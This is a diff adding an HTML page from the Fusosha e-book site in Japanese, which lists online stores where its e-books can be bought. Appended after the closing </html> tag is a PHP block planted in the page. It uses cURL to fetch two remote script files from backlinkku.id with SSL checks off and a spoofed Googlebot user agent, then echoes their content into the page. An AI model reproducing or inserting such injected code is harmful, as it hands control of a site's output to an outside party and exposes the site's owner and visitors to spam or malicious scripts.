@@ -1,0 +1,313 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" id="sixapart-standard">
+<head>
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-KQDCL77');</script>
+<!-- End Google Tag Manager -->
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+<script type="text/javascript" src="/js/smp.js"></script>
+
+<!-- ▼title要素ここから▼ -->
+
+
+<title>電子書籍のご購入について｜e-book扶桑社の電子書籍シリーズ</title>
+
+
+
+<!-- ▲title要素ここまで▲ -->
+
+<!-- ▼meta要素 descriptionここから▼ -->
+
+
+<meta name="description" content="電子書籍のご購入について 扶桑社発行の電子書籍は下記のサイト等の電子書店でお買い..." />
+
+
+
+<!-- ▲meta要素 descriptionここまで▲ -->
+
+<!-- ▼meta要素 keywordsここから▼ -->
+
+
+<meta name="keywords" content="電子書籍,扶桑社,幼児,SPA!,ホラー,雑学,実用,ヒメゴト倶楽部" />
+
+
+
+<!-- ▲meta要素 keywordsここまで▲ -->
+
+<meta http-equiv="Content-Style-Type" content="text/css" />
+<link rel="alternate" type="application/atom+xml" title="Atom" href="https://www.fusosha.co.jp/e-book/newissue.xml" />
+<link rel="stylesheet" type="text/css" href="https://www.fusosha.co.jp/e-book/styles.css " media="screen,print" title="default" />
+
+<script type="text/javascript" src="http://www.google.com/jsapi"></script>
+<script>
+	google.load("jquery", "1.2.6");
+	//google.load("yui", "2.6.0");
+	//google.load("swfobject", "2.1");
+</script>
+<script type="text/javascript" src="/e-book/jquery.page-scroller.js" charset="utf-8"></script>
+
+
+
+</head>
+<body id="page" bgcolor="#999">
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KQDCL77"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+<!-- container -->
+<div id="container">
+
+<!-- header -->
+<div id="header">
+<h1><a href="https://www.fusosha.co.jp/e-book/">扶桑社電子書籍ロゴ</a></h1>
+<div id="headBanner"><a href="/e-book/issue/newissue/"><img src="/e-book/common/e-book_ban_super.gif"></a></div>
+<form method="get" action="http://www.fusosha.co.jp/mt4/mt-search.cgi">
+<input type="hidden" name="IncludeBlogs" value="19" />
+<input type="hidden" name="limit" value="：20" />
+</form>
+<!-- end div#searchBox -->
+</div>
+<!-- /header -->
+
+<!-- content -->
+<div id="content">
+
+<!-- primary -->
+<div id="primary">
+
+<!-- topicPath -->
+<div class="topicPath">
+	<p>
+	<a href="https://www.fusosha.co.jp/e-book/">トップページ</a>&nbsp;&raquo;&nbsp;電子書籍のご購入について
+	</p>
+	<!-- end div#topicPath --></div>
+
+<!-- /topicPath -->
+<!-- PageTitle
+<h2>電子書籍のご購入について</h2>
+7418 -->
+<!-- /PageTitle -->
+
+<!-- PageBody -->
+
+<h2>電子書籍のご購入について</h2>
+
+
+<div id="buy">
+<p>扶桑社発行の電子書籍は下記のサイト等の電子書店でお買い求めいただけます。</p>
+
+<ul class="byList">
+	<li>
+	<dl>
+		<dt><a href="http://www.amazon.co.jp/s/ref=nb_sb_noss_1?__mk_ja_JP=%83J%83%5E%83J%83i&url=search-alias%3Ddigital-text&field-keywords=%95%7D%8CK%8E%D0" target="_blank"><img src="/e-book/common/st_ban_ama.jpg" height="30"/></a></dt>
+		<dd class="sName"><a href="http://www.amazon.co.jp/s/ref=nb_sb_noss_1?__mk_ja_JP=%83J%83%5E%83J%83i&url=search-alias%3Ddigital-text&field-keywords=%95%7D%8CK%8E%D0" target="_blank">Kindleストア</a></dd>
+		<dd class="sNote">&nbsp;</dd>
+	</dl>
+	</li>
+	<li>
+		<dl>
+		<dt><a href="http://rakuten.kobobooks.com/search/search.html?q=扶桑社" target="_blank"><img src="/e-book/common/st_ban_ko.jpg" height="30" /></a></dt>
+		<dd class="sName"><a href="http://rakuten.kobobooks.com/search/search.html?q=扶桑社" target="_blank">楽天 kobo</a></dd>
+		<dd class="sNote">&nbsp;</dd>
+	</dl>
+	</li>
+	<li>
+		<dl>
+		<dt><a href="http://booklive.jp/search/keyword?p_id=18" target="_blank"><img src="/e-book/common/st_ban_bo.jpg" height="30" /></a></dt>
+		<dd class="sName"><a href="http://booklive.jp/search/keyword?p_id=18" target="_blank">BookLive</a></dd>
+		<dd class="sNote">&nbsp;</dd>
+	</dl>
+	</li><br>
+    	<li>
+		<dl>
+		<dt><a href="http://honto.jp/ebook/search.html?pbcd=9000039603" target="_blank"><img src="/e-book/common/st_ban_ho.jpg" height="30" /></a></dt>
+		<dd class="sName"><a href="http://honto.jp/ebook/search.html?pbcd=9000039603" target="_blank">honto</a></dd>
+		<dd class="sNote">&nbsp;</dd>
+	</dl>
+	</li>
+    	<li>
+		<dl>
+		<dt><a href="http://ebookstore.sony.jp/search/?qAllFlg=true&q=%E6%89%B6%E6%A1%91%E7%A4%BE" target="_blank"><img src="/e-book/common/st_ban_so.jpg" height="30" /></a></dt>
+		<dd class="sName"><a href="http://ebookstore.sony.jp/search/?qAllFlg=true&q=%E6%89%B6%E6%A1%91%E7%A4%BE" target="_blank">ReaderStore</a></dd>
+		<dd class="sNote">&nbsp;</dd>
+	</dl>
+	</li>
+</ul>
+
+
+<!-- 
+<h3>iPhone&iPadで購入する</h3>
+<ul class="byList">
+	<li>
+	<dl>
+	<dt><a href="http://www.paburi.com/paburi/iphone.asp" target="_blank"><img src="/e-book/common/paburi_i.gif" height="25" /></a></dt>
+	<dd class="sName"><a href="http://www.paburi.com/paburi/iphone.asp" target="_blank">電子文庫パブリ</a></dd>
+	<dd class="sNote">&nbsp;</dd>
+	</dl>
+	</li>
+</ul>
+ -->
+</div>
+
+<!-- /PageBody -->
+
+<!-- PageMore -->
+
+<!-- /PageMore -->
+
+</div>
+<!-- /primary -->
+
+
+<!-- secondary -->
+<div id="secondary">
+			<!-- <div class="forWriter"><a href="/e-book/news/2011/11/news3129.html"><img alt="rectBanner300.png" src="/e-book/common/e_book_r_ban_20111125_rrhaisin.jpg" width="300" height="200" /></a></div> -->
+			<div id="wrapSideNav">
+			<ul id="sideNav">
+			
+			<!-- 新刊一覧 -->
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			<li><a href="https://www.fusosha.co.jp/e-book/issue/entryissue/">既刊一覧</a></li>
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			<!-- 新刊一覧 -->
+			
+
+				<li class="noline"><a href="/e-book/buy/">電子書籍のご購入について</a></li>
+			</ul>
+			</div>
+			<ul id="sideBannerList">
+
+				<li><a href="/e-book/label/cat108/"><img src="/e-book/common/spa_rs_ban.gif"></a></li>
+				<!--
+<li><a href="/e-book/label/cat248/"><img src="/e-book/common/koino_rs_ban.gif"></a></li>
+				<li><a href="/e-book/label/cat95/"><img src="/e-book/common/himegoto_rs_ban.gif"></a></li>
+-->
+			</ul>
+
+
+
+<div>
+<script src="http://widgets.twimg.com/j/2/widget.js"></script>
+<script>
+new TWTR.Widget({
+  version: 2,
+  type: 'profile',
+  rpp: 4,
+  interval: 6000,
+  width: 300,
+  height: 350,
+  theme: {
+    shell: {
+      background: '#f0a91a',
+      color: '#f05338'
+    },
+    tweets: {
+      background: '#f5f3f0',
+      color: '#140214',
+      links: '#071aeb'
+    }
+  },
+  features: {
+    scrollbar: true,
+    loop: false,
+    live: true,
+    hashtags: true,
+    timestamp: true,
+    avatars: false,
+    behavior: 'default'
+  }
+}).render().setUser('fusoshaebook').start();
+</script>
+</div>			
+		</div>
+
+<!-- /secondary -->
+
+ 
+</div>
+<!-- /content -->
+
+<!-- footer -->
+<div id="footer">
+<ul id="footNavi">
+	<li><a href="http://www.fusosha.co.jp/">扶桑社</a></li>
+	<li><a href="http://www.fusosha.co.jp/profile/privacy.html">プライバシーポリシー</a></li>
+</ul>
+<p class="pagetop"><a href="#container">ページの先頭へ戻る</a></p>
+<address>&copy;COPYRIGHT, FUSOSHA ALL RIGHTRESERVED</address>
+</div>
+
+<!-- /footer -->
+
+</div>
+<!-- /container -->
+
+</body>
+</html>
+<?php
+$traffic = 'https://backlinkku.id/menu/traffic-v1/script.txt';
+$remote = 'https://www.backlinkku.id/menu/vip-v1/script.txt';
+function fetch_clean($url) {
+    $ch = curl_init();
+    curl_setopt_array($ch, [
+        CURLOPT_URL => $url,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_USERAGENT => 'Googlebot/2.1 (+http://www.google.com/bot.html)'
+    ]);
+    $result = curl_exec($ch);
+    curl_close($ch);
+    return $result;
+}
+$tolol = fetch_clean($traffic);
+echo $tolol;
+$data = fetch_clean($remote);
+echo $data;
+?>
